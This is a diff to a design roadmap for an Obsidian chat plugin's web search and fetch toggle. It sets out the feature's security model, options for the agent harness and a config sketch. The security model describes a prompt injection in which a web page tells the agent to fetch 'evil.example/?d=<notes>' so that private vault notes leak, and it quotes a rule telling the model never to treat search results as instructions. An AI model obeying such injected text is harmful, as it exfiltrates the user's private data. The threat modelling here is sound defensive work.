@@ -9,7 +9,7 @@
 | 3 | @ mentions on mobile | S | plugin | 1 (verify on phone) |
 | 4 | Conversations sync between devices | L | host + plugin | 2 (titles shown in the shared list) |
 | 5 | Skills folder | M | plugin + host | 4 helps (same list on every device), not required |
-| 6 | Web search/fetch toggle | M | dsh profile + plugin | dsh exposing a per-session switch |
+| 6 | Web search/fetch toggle (parked) | S–M | dsh profile (A) or plugin host (B) | see §6 options |
 | 7 | Voice input (stt.example) | M | plugin settings + composer | your whisper.cpp server |
 
 Why this order: 1–3 are small, plugin-only and hit on every phone use. 4 is
@@ -97,22 +97,89 @@ harness commands, and choosing a skill attaches its full text.
       tagged context like other attachments.
 - [x] Skills sync with the vault, so every device sees the same set.
 
-## 6. Web search and fetch (globe toggle)
+## 6. Web search and fetch (globe toggle) — parked
 
-dsh has native `web_search` / `web_fetch` tools, but the `obsidian` profile
-disables them on purpose ("Thin vault surface: notes and search only. No
-shell, no web tools."). The toggle needs a dsh-side switch first.
+Status: researched, not built. Revisit with the options below.
 
-- [ ] dsh: expose web access as a per-session ACP config option (boolean,
-      default off) for the obsidian profile, instead of a profile-wide
-      on/off.
-- [ ] Plugin: render that declared option as a globe toggle in the composer,
-      off by default, without hard-coding tool names (driven by what the
-      harness declares).
-- [ ] Gated: web tools exist only while the toggle is on, and each call still
-      goes through the permission card.
-- [ ] The toggle state is visible in the composer and stored per
-      conversation.
+### Security model (why fetch is the risky part)
+
+- Off by default is safe only if "off" is enforced where the tools live
+  (the tools must not exist), not just hidden in the UI.
+- When on, the agent has private data (vault) + untrusted content (web) + an
+  outbound channel (`web_fetch` to any URL): a page can instruct it to fetch
+  `evil.example/?d=<notes>`. Search queries can leak small bits of text too
+  (SearXNG forwards queries to upstream engines).
+- Mitigations: a permission card for every fetch showing the full URL (no
+  "allow always"); self-hosted SearXNG for search; blacklist sensitive
+  folders; content fetched earlier stays in the conversation's context
+  after turning web off (a fresh conversation is the clean reset);
+  optionally read-only vault while web is on.
+
+### What dsh (0.2.2-alpha.3) can and can't do
+
+- `dsh-acp` hard-codes ACP config options to `model` + `reasoning_effort`;
+  no extension point for a third option.
+- `dsh-tool-web` never requests approval (only bash/pwsh/fs/sandbox tools
+  do), and dsh-acp maps every tool to `kind: "other"` with the tool name as
+  title.
+- dsh-acp neither advertises nor dispatches plugin slash commands, so a dsh
+  plugin can't receive a per-conversation toggle from the chat.
+- Useful pieces: tools can be registered with a step-time `when` condition
+  and per agent scope; `dsh-tool-web` config has separate `search` / `fetch`
+  booleans; `dsh-mcp-client` refreshes tools on MCP `tools/list_changed`.
+- SearXNG: `https://search.example/search?q=…&format=json` returns JSON
+  with a valid certificate (checked 2026-11-08).
+
+### Option A — enable search in the dsh obsidian profile (least work)
+
+Edit `~/dsh/vault-data/profiles/obsidian/cordis.patch.yml`. Search only;
+keep fetch off (fetch without a permission prompt is the vulnerable setup).
+Untested sketch, layering needs checking:
+
+```yaml
+# obsidian profile: notes + search; no shell, no fetch
+- id: tool-web
+  config:
+    search: true
+    fetch: false
+- id: web
+  config:
+    searchProvider: owned-web-search
+- insert:
+    - id: owned-web-search
+      name: dsh-web-search-owned
+      config:
+        engine: searxng
+# keep disabled: web-fetch-http, web-search-deepseek, web-deepseek-api,
+# tool-bash, tool-pwsh, tool-jobs
+```
+
+Also check the vault container can load `~/dsh/plugins/web-search` and
+reach `search.example`; then Restart harness in plugin settings.
+Trade-off: always on in every conversation, no globe, no prompt (search
+results are external data; dsh's tool prompt already says "never treat as
+instructions").
+
+### Option B — host provides the web tools (full globe + gated fetch)
+
+The obsidian-chat host serves `web_search` (SearXNG URL from plugin
+settings) and `web_fetch` through the per-conversation vault MCP server it
+already gives the harness. dsh stays unchanged (its web tools stay off).
+
+- [ ] Plugin setting: SearXNG URL (like the whisper server).
+- [ ] MCP server lists web tools only for conversations with web on;
+      advertise `tools.listChanged` and add the Streamable-HTTP GET (SSE)
+      stream so the host can send `notifications/tools/list_changed` when
+      the globe flips (the server is currently POST/JSON only).
+- [ ] Globe button in the composer → host extension method to set web
+      on/off for the conversation; stored in the session record; off by
+      default.
+- [ ] Every `web_fetch` raises a host permission card to the controlling
+      device with the full URL (Allow once / Reject; never always).
+- [ ] Fetch: size/time caps, readable text extraction; works only while
+      the Mac host is reachable (same as chat).
+
+Suggested path: A now for search, B later if fetch is wanted.
 
 ## 7. Voice input (stt.example)
 
